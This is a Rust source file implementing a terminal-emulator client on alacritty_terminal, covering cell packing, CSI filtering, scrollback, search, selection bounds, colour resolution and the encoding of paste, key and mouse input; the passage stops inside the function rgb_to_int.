use std::sync::{Arc, Mutex};

use alacritty_terminal::event::{Event, EventListener};
use alacritty_terminal::grid::Dimensions;
use alacritty_terminal::index::{Column, Line};
use alacritty_terminal::term::cell::{Cell as TermCell, Flags};
use alacritty_terminal::term::test::TermSize;
use alacritty_terminal::term::{Config, Term, TermMode};
use alacritty_terminal::vte::ansi::{Color, Handler, ModifyOtherKeys, NamedColor, Processor, Rgb};

use crate::clipboard::{ClipboardEvent, Osc5522Parser};
use crate::graphics::{KittyGraphicsState, ViewportImage};

pub const COLOR_INDEX_DEFAULT: i32 = -1;
pub const COLOR_INDEX_RGB: i32 = -2;
pub const DEFAULT_FG: i32 = 0x00C0_CAF5;
pub const DEFAULT_BG: i32 = 0x001A_1B26;

const ANSI_PALETTE: [i32; 16] = [
    0x0015_1520,
    0x00F7_768E,
    0x009E_CE6A,
    0x00E0_AF68,
    0x007A_A2F7,
    0x00BB_9AF7,
    0x007D_CFFF,
    0x00C0_CAF5,
    0x0056_5F89,
    0x00F7_768E,
    0x009E_CE6A,
    0x00E0_AF68,
    0x007A_A2F7,
    0x00BB_9AF7,
    0x007D_CFFF,
    0x00C0_CAF5,
];

pub mod attr {
    pub const BOLD: u16 = 1;
    pub const DIM: u16 = 2;
    pub const ITALIC: u16 = 4;
    pub const UNDERLINE: u16 = 8;
    pub const INVERSE: u16 = 16;
    pub const HIDDEN: u16 = 32;
    pub const STRIKE: u16 = 64;
    pub const DOUBLE_UNDERLINE: u16 = 128;
    pub const UNDERCURL: u16 = 256;
    pub const DOTTED_UNDERLINE: u16 = 512;
    pub const DASHED_UNDERLINE: u16 = 1024;
    pub const HYPERLINK: u16 = 2048;
}

/// 每个格子的固定二进制打包长度（字节）。
/// 布局（小端序）：
/// - 0..4:   codepoint (u32)
/// - 4..8:   fg (i32)
/// - 8..12:  bg (i32)
/// - 12..14: fg_index (i16)
/// - 14..16: bg_index (i16)
/// - 16..18: attrs (u16)
/// - 18:     width (u8: 0, 1, 2)
/// - 19:     reserved (u8: 0)
pub const PACKED_CELL_BYTES: usize = 20;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ClientCell {
    pub codepoint: u32,
    pub fg: i32,
    pub bg: i32,
    pub attrs: u16,
    pub width: u8,
    pub fg_index: i32,
    pub bg_index: i32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ClientTermState {
    pub cols: u32,
    pub rows: u32,
    pub cursor_x: u32,
    pub cursor_y: u32,
    pub cursor_visible: bool,
    pub application_cursor: bool,
    pub bracketed_paste: bool,
    pub modify_other_keys: u8,
    pub kitty_keyboard_flags: u8,
    pub kitty_clipboard_paste_mode: bool,
    pub scroll_offset: u32,
    pub max_scroll_offset: u32,
    pub mouse_tracking: bool,
    pub alt_screen: bool,
}

pub fn kitty_flags_from_mode(mode: TermMode) -> u8 {
    let mut flags = 0u8;
    if mode.contains(TermMode::DISAMBIGUATE_ESC_CODES) {
        flags |= 1;
    }
    if mode.contains(TermMode::REPORT_EVENT_TYPES) {
        flags |= 2;
    }
    if mode.contains(TermMode::REPORT_ALTERNATE_KEYS) {
        flags |= 4;
    }
    if mode.contains(TermMode::REPORT_ALL_KEYS_AS_ESC) {
        flags |= 8;
    }
    if mode.contains(TermMode::REPORT_ASSOCIATED_TEXT) {
        flags |= 16;
    }
    flags
}

#[derive(Default)]
struct KeyModes {
    modify_other_keys: u8,
}

impl Handler for KeyModes {
    fn set_modify_other_keys(&mut self, mode: ModifyOtherKeys) {
        self.modify_other_keys = match mode {
            ModifyOtherKeys::Reset => 0,
            ModifyOtherKeys::EnableExceptWellDefined => 1,
            ModifyOtherKeys::EnableAll => 2,
        };
    }

    fn reset_state(&mut self) {
        *self = Self::default();
    }
}

/// 过滤非 SGR 序列中携带 `:` 子参数的非法 CSI（ECMA-48 / ITU T.416 子参数仅对 `m` SGR 有定义）。
/// `vte` 默认只取子参数切片的第一个元素执行，会把 `CSI 1:2 H` 当成 `CSI 1 H`。
#[derive(Default)]
struct CsiColonFilter {
    state: FilterState,
    buf: Vec<u8>,
    has_colon: bool,
}

#[derive(Default, Clone, Copy, PartialEq, Eq)]
enum FilterState {
    #[default]
    Ground,
    Esc,
    Csi,
}

impl CsiColonFilter {
    fn reset(&mut self) {
        self.state = FilterState::Ground;
        self.buf.clear();
        self.has_colon = false;
    }

    fn filter<F: FnMut(&[u8])>(&mut self, input: &[u8], mut emit: F) {
        let mut passthrough_start = 0usize;
        for (i, &b) in input.iter().enumerate() {
            match self.state {
                FilterState::Ground => {
                    if b == 0x1b {
                        if i > passthrough_start {
                            emit(&input[passthrough_start..i]);
                        }
                        self.state = FilterState::Esc;
                        self.buf.clear();
                        self.buf.push(b);
                        self.has_colon = false;
                        passthrough_start = i + 1;
                    }
                }
                FilterState::Esc => {
                    passthrough_start = i + 1;
                    if b == b'[' {
                        self.state = FilterState::Csi;
                        self.buf.push(b);
                    } else if b == 0x1b {
                        emit(&self.buf);
                        self.buf.clear();
                        self.buf.push(b);
                    } else {
                        self.buf.push(b);
                        emit(&self.buf);
                        self.buf.clear();
                        self.state = FilterState::Ground;
                    }
                }
                FilterState::Csi => {
                    passthrough_start = i + 1;
                    if b == b':' {
                        self.has_colon = true;
                        self.buf.push(b);
                    } else if (0x20..=0x3f).contains(&b) {
                        self.buf.push(b);
                    } else if (0x40..=0x7e).contains(&b) {
                        self.buf.push(b);
                        if !self.has_colon || b == b'm' {
                            emit(&self.buf);
                        }
                        self.buf.clear();
                        self.has_colon = false;
                        self.state = FilterState::Ground;
                    } else if b == 0x1b {
                        self.buf.clear();
                        self.buf.push(b);
                        self.has_colon = false;
                        self.state = FilterState::Esc;
                    } else {
                        // CSI 中夹杂 C0 控制字符或非法字节：原样交给 vte 处理
                        self.buf.push(b);
                        emit(&self.buf);
                        self.buf.clear();
                        self.has_colon = false;
                        self.state = FilterState::Ground;
                    }
                }
            }
        }
        if self.state == FilterState::Ground && passthrough_start < input.len() {
            emit(&input[passthrough_start..]);
        }
    }
}

#[derive(Clone)]
struct ClientEventListener {
    clipboard_events: Arc<Mutex<Vec<ClipboardEvent>>>,
}

impl EventListener for ClientEventListener {
    fn send_event(&self, event: Event) {
        if let Event::ClipboardStore(_, text) = event {
            self.clipboard_events
                .lock()
                .unwrap()
                .push(ClipboardEvent::Write {
                    mime: "text/plain".into(),
                    data: text.into_bytes(),
                });
        }
    }
}

pub struct ClientTerm {
    term: Term<ClientEventListener>,
    parser: Processor,
    key_modes: KeyModes,
    key_modes_parser: Processor,
    csi_filter: CsiColonFilter,
    osc5522: Osc5522Parser,
    graphics: KittyGraphicsState,
    clipboard_events: Arc<Mutex<Vec<ClipboardEvent>>>,
    cols: u16,
    rows: u16,
    max_scrollback: usize,
    scroll_offset: usize,
}

impl ClientTerm {
    pub fn new(cols: u16, rows: u16, max_scrollback: usize) -> Self {
        let cols = cols.max(1);
        let rows = rows.max(1);
        let max_scrollback = max_scrollback.min(200_000);
        let size = TermSize::new(cols as usize, rows as usize);
        let config = Config {
            scrolling_history: max_scrollback,
            kitty_keyboard: true,
            ..Config::default()
        };
        let clipboard_events = Arc::new(Mutex::new(Vec::new()));
        Self {
            term: Term::new(
                config,
                &size,
                ClientEventListener {
                    clipboard_events: clipboard_events.clone(),
                },
            ),
            parser: Processor::new(),
            key_modes: KeyModes::default(),
            key_modes_parser: Processor::new(),
            csi_filter: CsiColonFilter::default(),
            osc5522: Osc5522Parser::new(),
            graphics: KittyGraphicsState::new(),
            clipboard_events,
            cols,
            rows,
            max_scrollback,
            scroll_offset: 0,
        }
    }

    pub fn write(&mut self, bytes: &[u8]) -> ClientTermState {
        let term = &mut self.term;
        let parser = &mut self.parser;
        let key_modes = &mut self.key_modes;
        let key_modes_parser = &mut self.key_modes_parser;
        let csi_filter = &mut self.csi_filter;
        let graphics = &mut self.graphics;
        let clipboard_events = &self.clipboard_events;
        let cols = self.cols;
        let rows = self.rows;
        self.osc5522.filter(
            bytes,
            |ev| clipboard_events.lock().unwrap().push(ev),
            |passthrough| {
                graphics.filter(
                    passthrough,
                    |non_apc| {
                        if !non_apc.is_empty() {
                            csi_filter.filter(non_apc, |chunk| {
                                parser.advance(term, chunk);
                                key_modes_parser.advance(key_modes, chunk);
                            });
                        }
                        let grid = term.grid();
                        let cursor = grid.cursor.point;
                        let cursor_col =
                            (cursor.column.0 as u32).min(cols.saturating_sub(1) as u32);
                        let cursor_line = cursor.line.0.max(0) as i64;
                        let abs_cursor_row = grid.history_size() as i64 + cursor_line;
                        (cursor_col, abs_cursor_row, cols as u32, rows as u32)
                    },
                    |_reply| {},
                );
            },
        );
        self.clamp_scroll_offset();
        self.state()
    }

    pub fn reset(&mut self) -> ClientTermState {
        let size = TermSize::new(self.cols as usize, self.rows as usize);
        let config = Config {
            scrolling_history: self.max_scrollback,
            kitty_keyboard: true,
            ..Config::default()
        };
        self.clipboard_events.lock().unwrap().clear();
        self.term = Term::new(
            config,
            &size,
            ClientEventListener {
                clipboard_events: self.clipboard_events.clone(),
            },
        );
        self.parser = Processor::new();
        self.key_modes = KeyModes::default();
        self.key_modes_parser = Processor::new();
        self.csi_filter.reset();
        self.osc5522.reset();
        self.graphics.reset();
        self.scroll_offset = 0;
        self.state()
    }

    pub fn drain_clipboard_events(&mut self) -> Vec<ClipboardEvent> {
        std::mem::take(&mut *self.clipboard_events.lock().unwrap())
    }

    pub fn visible_images(&self) -> Vec<ViewportImage> {
        let viewport_top_abs_row = self.history_size() as i64 - self.viewport_offset() as i64;
        self.graphics
            .visible_images(viewport_top_abs_row, self.rows as usize)
    }

    pub fn resize(&mut self, new_cols: u16, new_rows: u16) -> ClientTermState {
        let c = new_cols.max(1);
        let r = new_rows.max(1);
        if c == self.cols && r == self.rows {
            return self.state();
        }
        self.cols = c;
        self.rows = r;
        self.term.resize(TermSize::new(c as usize, r as usize));
        self.clamp_scroll_offset();
        self.state()
    }

    pub fn scroll_by(&mut self, delta: i32) -> ClientTermState {
        if delta == 0 || self.is_alt_screen() {
            return self.state();
        }
        let max_off = self.history_size() as i64;
        let next = (self.scroll_offset as i64 + delta as i64).clamp(0, max_off) as usize;
        self.scroll_offset = next;
        self.state()
    }

    pub fn scroll_to_bottom(&mut self) -> ClientTermState {
        self.scroll_offset = 0;
        self.state()
    }

    pub fn set_max_scrollback(&mut self, limit: usize) -> ClientTermState {
        self.max_scrollback = limit.min(200_000);
        let config = Config {
            scrolling_history: self.max_scrollback,
            kitty_keyboard: true,
            ..Config::default()
        };
        self.term.set_options(config);
        self.clamp_scroll_offset();
        self.state()
    }

    pub fn state(&self) -> ClientTermState {
        let grid = self.term.grid();
        let cursor = grid.cursor.point;
        let mode = *self.term.mode();
        let cursor_x = (cursor.column.0 as u32).min(self.cols.saturating_sub(1) as u32);
        let cursor_y = (cursor.line.0.max(0) as u32).min(self.rows.saturating_sub(1) as u32);
        ClientTermState {
            cols: self.cols as u32,
            rows: self.rows as u32,
            cursor_x,
            cursor_y,
            cursor_visible: mode.contains(TermMode::SHOW_CURSOR),
            application_cursor: mode.contains(TermMode::APP_CURSOR),
            bracketed_paste: mode.contains(TermMode::BRACKETED_PASTE),
            modify_other_keys: self.key_modes.modify_other_keys,
            kitty_keyboard_flags: kitty_flags_from_mode(mode),
            kitty_clipboard_paste_mode: self.osc5522.paste_mode(),
            scroll_offset: self.viewport_offset() as u32,
            max_scroll_offset: self.max_scroll_offset() as u32,
            mouse_tracking: mode.intersects(TermMode::MOUSE_MODE),
            alt_screen: mode.contains(TermMode::ALT_SCREEN),
        }
    }

    pub fn cell(&self, x: usize, y: usize) -> ClientCell {
        self.cell_at_offset(x, y, 0)
    }

    pub fn cell_scrolled(&self, x: usize, y: usize) -> ClientCell {
        self.cell_at_offset(x, y, self.viewport_offset())
    }

    pub fn hyperlink_at(&self, col: usize, row: usize) -> Option<String> {
        if col >= self.cols as usize || row >= self.rows as usize {
            return None;
        }
        let grid = self.term.grid();
        let line = Line(row as i32 - self.viewport_offset() as i32);
        let cell = &grid[line][Column(col)];
        let link = cell.hyperlink()?;
        let uri = link.uri();
        if is_safe_hyperlink_uri(uri) {
            Some(uri.to_string())
        } else {
            None
        }
    }

    pub fn snapshot_packed(&self) -> Vec<u8> {
        let rows = self.rows as usize;
        let cols = self.cols as usize;
        let off = self.viewport_offset();
        let mut out = Vec::with_capacity(rows * cols * PACKED_CELL_BYTES);
        let grid = self.term.grid();
        let colors = self.term.colors();
        for y in 0..rows {
            let line = Line(y as i32 - off as i32);
            let row = &grid[line];
            for x in 0..cols {
                let c = convert_cell(&row[Column(x)], colors);
                pack_cell(&c, &mut out);
            }
        }
        out
    }

    pub fn cell_packed(&self, x: usize, y: usize) -> Vec<u8> {
        let mut out = Vec::with_capacity(PACKED_CELL_BYTES);
        let c = self.cell(x, y);
        pack_cell(&c, &mut out);
        out
    }

    /// 把当前视口里的一块选区收成纯文本。坐标是当前视口上的格子，宽字符只收一次，行尾空格裁掉。
    pub fn copy_viewport(&self, x0: i32, y0: i32, x1: i32, y1: i32) -> String {
        let height = self.rows as i32;
        let width = self.cols as i32;
        if height <= 0 || width <= 0 {
            return String::new();
        }
        let (mut ax, mut ay, mut bx, mut by) = if y0 > y1 || (y0 == y1 && x0 > x1) {
            (x1, y1, x0, y0)
        } else {
            (x0, y0, x1, y1)
        };
        ay = ay.clamp(0, height - 1);
        by = by.clamp(0, height - 1);
        ax = ax.clamp(0, width - 1);
        bx = bx.clamp(0, width - 1);
        let off = self.viewport_offset() as i32;
        let grid = self.term.grid();
        let mut lines = Vec::with_capacity((by - ay + 1) as usize);
        for y in ay..=by {
            let row = &grid[Line(y - off)];
            let from = if y == ay { ax } else { 0 };
            let to = if y == by { bx } else { width - 1 };
            let mut sb = String::new();
            for x in from..=to {
                let cell = &row[Column(x as usize)];
                if cell.flags.contains(Flags::WIDE_CHAR_SPACER)
                    || cell.flags.contains(Flags::LEADING_WIDE_CHAR_SPACER)
                {
                    continue;
                }
                let ch = if cell.c == '\0' { ' ' } else { cell.c };
                sb.push(ch);
                if let Some(zw) = cell.zerowidth() {
                    for &c in zw {
                        sb.push(c);
                    }
                }
            }
            lines.push(sb.trim_end().to_string());
        }
        lines.join("\n")
    }

    pub fn scroll_to_offset(&mut self, offset: usize) -> ClientTermState {
        if self.is_alt_screen() {
            return self.state();
        }
        self.scroll_offset = offset.min(self.history_size());
        self.state()
    }

    pub fn search_substring(&self, query: &str) -> Vec<(usize, usize, usize)> {
        let q = query.trim();
        if q.is_empty() {
            return Vec::new();
        }
        let q_lower: Vec<char> = q.to_lowercase().chars().collect();
        if q_lower.is_empty() {
            return Vec::new();
        }
        let hist = self.max_scroll_offset();
        let rows = self.rows as usize;
        let cols = self.cols as usize;
        let total_lines = hist + rows;
        let grid = self.term.grid();
        let mut matches = Vec::new();

        for abs_row in 0..total_lines {
            let line_idx = Line(abs_row as i32 - hist as i32);
            let row = &grid[line_idx];
            let mut row_chars: Vec<(char, usize, usize)> = Vec::with_capacity(cols);
            for x in 0..cols {
                let cell = &row[Column(x)];
                if cell.flags.contains(Flags::WIDE_CHAR_SPACER)
                    || cell.flags.contains(Flags::LEADING_WIDE_CHAR_SPACER)
                {
                    continue;
                }
                let ch = if cell.c == '\0' { ' ' } else { cell.c };
                let w = if cell.flags.contains(Flags::WIDE_CHAR) { 2 } else { 1 };
                for lc in ch.to_lowercase() {
                    row_chars.push((lc, x, (x + w).min(cols)));
                }
            }
            if row_chars.len() < q_lower.len() {
                continue;
            }
            let mut i = 0;
            while i + q_lower.len() <= row_chars.len() {
                let mut ok = true;
                for j in 0..q_lower.len() {
                    if row_chars[i + j].0 != q_lower[j] {
                        ok = false;
                        break;
                    }
                }
                if ok {
                    let col_start = row_chars[i].1;
                    let col_end = row_chars[i + q_lower.len() - 1].2;
                    matches.push((abs_row, col_start, col_end));
                    i += q_lower.len();
                } else {
                    i += 1;
                }
            }
        }
        matches
    }

    pub fn paste_requires_confirmation(&self, text: &str) -> bool {
        !self.term.mode().contains(TermMode::BRACKETED_PASTE)
            && (text.contains('\n') || text.contains('\r'))
    }

    pub fn encode_paste(&self, text: &str) -> Vec<u8> {
        let sanitized: String = text
            .chars()
            .filter(|&c| c != '\x1b' && c != '\u{9b}')
            .collect();
        let raw = sanitized.replace("\r\n", "\r").replace('\n', "\r");
        if self.term.mode().contains(TermMode::BRACKETED_PASTE) {
            format!("\x1b[200~{raw}\x1b[201~").into_bytes()
        } else {
            raw.into_bytes()
        }
    }

    pub fn encode_key(
        &self,
        input: &crate::keyboard::KeyInput,
        server_os: &str,
        win32_input_mode: bool,
    ) -> Vec<u8> {
        crate::keyboard::encode_key(input, &self.state(), server_os, win32_input_mode)
    }

    pub fn encode_pointer(
        &self,
        col: i32,
        row: i32,
        button: i32,
        pressed: bool,
        moving: bool,
    ) -> Option<Vec<u8>> {
        let mode = *self.term.mode();
        let mouse_tracking = mode.intersects(TermMode::MOUSE_MODE);
        if !mouse_tracking {
            return None;
        }
        let mouse_any = mode.contains(TermMode::MOUSE_MOTION);
        let mouse_drag = mode.intersects(TermMode::MOUSE_DRAG | TermMode::MOUSE_MOTION);
        let mouse_sgr = mode.contains(TermMode::SGR_MOUSE);
        if moving && !pressed && !mouse_any {
            return None;
        }
        if moving && pressed && !mouse_drag && !mouse_any {
            return None;
        }
        let x = col + 1;
        let y = row + 1;
        if x < 1 || y < 1 {
            return None;
        }
        let btn = button.clamp(0, 2);
        if mouse_sgr {
            let code = if moving { btn + 32 } else { btn };
            let end = if pressed || moving { 'M' } else { 'm' };
            Some(format!("\x1b[<{code};{x};{y}{end}").into_bytes())
        } else {
            if x > 223 || y > 223 {
                return Some(Vec::new());
            }
            let code = if moving {
                btn + 32
            } else if !pressed {
                3
            } else {
                btn
            };
            Some(vec![
                0x1b,
                b'[',
                b'M',
                (code + 32) as u8,
                (x + 32) as u8,
                (y + 32) as u8,
            ])
        }
    }

    /// 把滚轮/触屏滑动行数编码为终端输入字节。
    ///
    /// - `delta_lines > 0` 表示向上翻（更早内容，滚轮上 64 / 方向键上）；
    /// - `delta_lines < 0` 表示向下翻（更新内容，滚轮下 65 / 方向键下）。
    /// - 返回 `None` 时调用方应走本地 `scroll_by(delta_lines)`。
    pub fn encode_wheel(&self, col: i32, row: i32, delta_lines: i32) -> Option<Vec<u8>> {
        if delta_lines == 0 {
            return None;
        }
        let mode = *self.term.mode();
        let count = delta_lines.unsigned_abs().min(10) as usize;
        let scroll_up = delta_lines > 0;

        if mode.intersects(TermMode::MOUSE_MODE) && self.viewport_offset() == 0 {
            let max_col = self.cols.saturating_sub(1) as i32;
            let max_row = self.rows.saturating_sub(1) as i32;
            let x = col.clamp(0, max_col) + 1;
            let y = row.clamp(0, max_row) + 1;
            let btn = if scroll_up { 64 } else { 65 };
            if mode.contains(TermMode::SGR_MOUSE) {
                let single = format!("\x1b[<{btn};{x};{y}M");
                let mut out = Vec::with_capacity(single.len() * count);
                for _ in 0..count {
                    out.extend_from_slice(single.as_bytes());
                }
                return Some(out);
            }
            if x > 223 || y > 223 {
                return Some(Vec::new());
            }
            let single = [
                0x1b,
                b'[',
                b'M',
                (btn + 32) as u8,
                (x + 32) as u8,
                (y + 32) as u8,
            ];
            let mut out = Vec::with_capacity(single.len() * count);
            for _ in 0..count {
                out.extend_from_slice(&single);
            }
            return Some(out);
        }

        if mode.contains(TermMode::ALT_SCREEN) && mode.contains(TermMode::ALTERNATE_SCROLL) {
            let seq: &[u8] = match (scroll_up, mode.contains(TermMode::APP_CURSOR)) {
                (true, true) => b"\x1bOA",
                (true, false) => b"\x1b[A",
                (false, true) => b"\x1bOB",
                (false, false) => b"\x1b[B",
            };
            let mut out = Vec::with_capacity(seq.len() * count);
            for _ in 0..count {
                out.extend_from_slice(seq);
            }
            return Some(out);
        }

        None
    }

    /// 查找视口坐标 `(col, row)` 处词语/token 的闭区间列范围 `(start_col, end_col)`。
    /// 空白格返回 `None`；宽字符会自动对齐到首格并在右端覆盖其 spacer 列。
    pub fn word_bounds_at(&self, col: usize, row: usize) -> Option<(u32, u32)> {
        let cols = self.cols as usize;
        let rows = self.rows as usize;
        if col >= cols || row >= rows {
            return None;
        }
        let grid = self.term.grid();
        let line = &grid[Line(row as i32 - self.viewport_offset() as i32)];
        let lead = leading_cell_col(line, col, cols)?;
        let kind = classify_word_char(line[Column(lead)].c);
        if kind == WordCharKind::Blank {
            return None;
        }
        if kind == WordCharKind::Delimiter {
            let end = cell_end_col(line, lead, cols);
            return Some((lead as u32, end as u32));
        }

        let mut start = lead;
        while start > 0 {
            let prev = leading_cell_col(line, start - 1, cols)?;
            if classify_word_char(line[Column(prev)].c) != WordCharKind::Word {
                break;
            }
            start = prev;
        }

        let mut end = cell_end_col(line, lead, cols);
        while end + 1 < cols {
            let next = end + 1;
            let cell = &line[Column(next)];
            if cell.flags.contains(Flags::WIDE_CHAR_SPACER)
                || cell.flags.contains(Flags::LEADING_WIDE_CHAR_SPACER)
            {
                end = next;
                continue;
            }
            if classify_word_char(cell.c) != WordCharKind::Word {
                break;
            }
            end = cell_end_col(line, next, cols);
        }

        Some((start as u32, end as u32))
    }

    /// 返回视口行 `row` 上非空白内容的闭区间列范围 `(start_col, end_col)`；全空行返回 `None`。
    pub fn line_bounds_at(&self, row: usize) -> Option<(u32, u32)> {
        let cols = self.cols as usize;
        let rows = self.rows as usize;
        if row >= rows || cols == 0 {
            return None;
        }
        let grid = self.term.grid();
        let line = &grid[Line(row as i32 - self.viewport_offset() as i32)];
        let mut first: Option<usize> = None;
        let mut last: Option<usize> = None;
        let mut x = 0;
        while x < cols {
            let cell = &line[Column(x)];
            if cell.flags.contains(Flags::WIDE_CHAR_SPACER)
                || cell.flags.contains(Flags::LEADING_WIDE_CHAR_SPACER)
            {
                x += 1;
                continue;
            }
            let end = cell_end_col(line, x, cols);
            if classify_word_char(cell.c) != WordCharKind::Blank {
                if first.is_none() {
                    first = Some(x);
                }
                last = Some(end);
            }
            x = end + 1;
        }
        match (first, last) {
            (Some(s), Some(e)) => Some((s as u32, e as u32)),
            _ => None,
        }
    }

    fn is_alt_screen(&self) -> bool {
        self.term.mode().contains(TermMode::ALT_SCREEN)
    }

    fn history_size(&self) -> usize {
        self.term.grid().history_size()
    }

    fn max_scroll_offset(&self) -> usize {
        if self.is_alt_screen() {
            0
        } else {
            self.history_size()
        }
    }

    fn viewport_offset(&self) -> usize {
        if self.is_alt_screen() {
            0
        } else {
            self.scroll_offset.min(self.history_size())
        }
    }

    fn clamp_scroll_offset(&mut self) {
        self.scroll_offset = if self.is_alt_screen() {
            0
        } else {
            self.scroll_offset.min(self.history_size())
        };
    }

    fn cell_at_offset(&self, x: usize, y: usize, off: usize) -> ClientCell {
        if x >= self.cols as usize || y >= self.rows as usize {
            return blank_cell();
        }
        let grid = self.term.grid();
        let line = Line(y as i32 - off as i32);
        let cell = &grid[line][Column(x)];
        convert_cell(cell, self.term.colors())
    }
}

fn blank_cell() -> ClientCell {
    ClientCell {
        codepoint: ' ' as u32,
        fg: DEFAULT_FG,
        bg: DEFAULT_BG,
        attrs: 0,
        width: 1,
        fg_index: COLOR_INDEX_DEFAULT,
        bg_index: COLOR_INDEX_DEFAULT,
    }
}

fn pack_cell(cell: &ClientCell, out: &mut Vec<u8>) {
    out.extend_from_slice(&cell.codepoint.to_le_bytes());
    out.extend_from_slice(&cell.fg.to_le_bytes());
    out.extend_from_slice(&cell.bg.to_le_bytes());
    out.extend_from_slice(&(cell.fg_index as i16).to_le_bytes());
    out.extend_from_slice(&(cell.bg_index as i16).to_le_bytes());
    out.extend_from_slice(&cell.attrs.to_le_bytes());
    out.push(cell.width);
    out.push(0);
}

fn convert_cell(cell: &TermCell, colors: &alacritty_terminal::term::color::Colors) -> ClientCell {
    let mut attrs = map_flags(cell.flags);
    if cell
        .hyperlink()
        .is_some_and(|link| is_safe_hyperlink_uri(link.uri()))
    {
        attrs |= attr::HYPERLINK;
    }
    if cell.flags.contains(Flags::WIDE_CHAR_SPACER)
        || cell.flags.contains(Flags::LEADING_WIDE_CHAR_SPACER)
    {
        let (fg, fg_index) = resolve_color(cell.fg, true, colors);
        let (bg, bg_index) = resolve_color(cell.bg, false, colors);
        return ClientCell {
            codepoint: ' ' as u32,
            fg,
            bg,
            attrs,
            width: 0,
            fg_index,
            bg_index,
        };
    }
    let ch = if cell.c == '\0' { ' ' } else { cell.c };
    let width = if cell.flags.contains(Flags::WIDE_CHAR) { 2 } else { 1 };
    let (fg, fg_index) = resolve_color(cell.fg, true, colors);
    let (bg, bg_index) = resolve_color(cell.bg, false, colors);
    ClientCell {
        codepoint: ch as u32,
        fg,
        bg,
        attrs,
        width,
        fg_index,
        bg_index,
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum WordCharKind {
    Blank,
    Delimiter,
    Word,
}

fn classify_word_char(c: char) -> WordCharKind {
    if c == '\0' || c.is_whitespace() {
        return WordCharKind::Blank;
    }
    if matches!(
        c,
        '(' | ')'
            | '['
            | ']'
            | '{'
            | '}'
            | '<'
            | '>'
            | '"'
            | '\''
            | '`'
            | ','
            | ';'
            | '!'
            | '|'
            | '│'
            | '\u{2500}'..='\u{257F}'
            | '，'
            | '。'
            | '、'
            | '；'
            | '：'
            | '！'
            | '？'
            | '「'
            | '」'
            | '『'
            | '』'
            | '（'
            | '）'
            | '【'
            | '】'
            | '《'
            | '》'
            | '“'
            | '”'
            | '‘'
            | '’'
    ) {
        return WordCharKind::Delimiter;
    }
    WordCharKind::Word
}

fn leading_cell_col(
    line: &alacritty_terminal::grid::Row<TermCell>,
    col: usize,
    cols: usize,
) -> Option<usize> {
    if col >= cols {
        return None;
    }
    let cell = &line[Column(col)];
    if (cell.flags.contains(Flags::WIDE_CHAR_SPACER)
        || cell.flags.contains(Flags::LEADING_WIDE_CHAR_SPACER))
        && col > 0
    {
        return Some(col - 1);
    }
    Some(col)
}

fn cell_end_col(
    line: &alacritty_terminal::grid::Row<TermCell>,
    col: usize,
    cols: usize,
) -> usize {
    if col + 1 < cols && line[Column(col)].flags.contains(Flags::WIDE_CHAR) {
        col + 1
    } else {
        col
    }
}

fn is_safe_hyperlink_uri(uri: &str) -> bool {
    if uri.is_empty() || uri.len() > 2048 {
        return false;
    }
    if uri.bytes().any(|b| b <= 0x1f || b == 0x7f) {
        return false;
    }
    uri.get(..8)
        .is_some_and(|p| p.eq_ignore_ascii_case("https://"))
        || uri
            .get(..7)
            .is_some_and(|p| p.eq_ignore_ascii_case("http://"))
        || uri
            .get(..7)
            .is_some_and(|p| p.eq_ignore_ascii_case("mailto:"))
}

fn map_flags(flags: Flags) -> u16 {
    let mut out = 0u16;
    if flags.contains(Flags::BOLD) {
        out |= attr::BOLD;
    }
    if flags.contains(Flags::DIM) {
        out |= attr::DIM;
    }
    if flags.contains(Flags::ITALIC) {
        out |= attr::ITALIC;
    }
    if flags.intersects(
        Flags::UNDERLINE
            | Flags::DOUBLE_UNDERLINE
            | Flags::UNDERCURL
            | Flags::DOTTED_UNDERLINE
            | Flags::DASHED_UNDERLINE,
    ) {
        out |= attr::UNDERLINE;
    }
    if flags.contains(Flags::DOUBLE_UNDERLINE) {
        out |= attr::DOUBLE_UNDERLINE;
    }
    if flags.contains(Flags::UNDERCURL) {
        out |= attr::UNDERCURL;
    }
    if flags.contains(Flags::DOTTED_UNDERLINE) {
        out |= attr::DOTTED_UNDERLINE;
    }
    if flags.contains(Flags::DASHED_UNDERLINE) {
        out |= attr::DASHED_UNDERLINE;
    }
    if flags.contains(Flags::INVERSE) {
        out |= attr::INVERSE;
    }
    if flags.contains(Flags::HIDDEN) {
        out |= attr::HIDDEN;
    }
    if flags.contains(Flags::STRIKEOUT) {
        out |= attr::STRIKE;
    }
    out
}

fn resolve_color(
    color: Color,
    is_fg: bool,
    colors: &alacritty_terminal::term::color::Colors,
) -> (i32, i32) {
    match color {
        Color::Spec(rgb) => (rgb_to_int(rgb), COLOR_INDEX_RGB),
        Color::Indexed(idx) => {
            if let Some(rgb) = colors[idx as usize] {
                return (rgb_to_int(rgb), COLOR_INDEX_RGB);
            }
            (indexed_color(idx), idx as i32)
        }
        Color::Named(named) => {
            if let Some(rgb) = colors[named as usize] {
                return (rgb_to_int(rgb), COLOR_INDEX_RGB);
            }
            if let Some(ansi_idx) = named_ansi_index(named) {
                (ANSI_PALETTE[ansi_idx], ansi_idx as i32)
            } else {
                let default_rgb = if is_fg { DEFAULT_FG } else { DEFAULT_BG };
                (default_rgb, COLOR_INDEX_DEFAULT)
            }
        }
    }
}

fn named_ansi_index(named: NamedColor) -> Option<usize> {
    use NamedColor::*;
    Some(match named {
        Black => 0,
        Red => 1,
        Green => 2,
        Yellow => 3,
        Blue => 4,
        Magenta => 5,
        Cyan => 6,
        White => 7,
        BrightBlack => 8,
        BrightRed => 9,
        BrightGreen => 10,
        BrightYellow => 11,
        BrightBlue => 12,
        BrightMagenta => 13,
        BrightCyan => 14,
        BrightWhite => 15,
        DimBlack => 0,
        DimRed => 1,
        DimGreen => 2,
        DimYellow => 3,
        DimBlue => 4,
        DimMagenta => 5,
        DimCyan => 6,
        DimWhite => 7,
        _ => return None,
    })
}

fn indexed_color(idx: u8) -> i32 {
    let i = idx as usize;
    if i < 16 {
        return ANSI_PALETTE[i];
    }
    if i < 232 {
        let v = i - 16;
        let r = v / 36;
        let g = (v % 36) / 6;
        let b = v % 6;
        let level = |n: usize| if n == 0 { 0 } else { (55 + n * 40) as u8 };
        return rgb_to_int(Rgb {
            r: level(r),
            g: level(g),
            b: level(b),
        });
    }
    let g = (8 + (i - 232) * 10) as u8;
    rgb_to_int(Rgb { r: g, g, b: g })
}

fn rgb_to_int(rgb: Rgb) -> i32 {
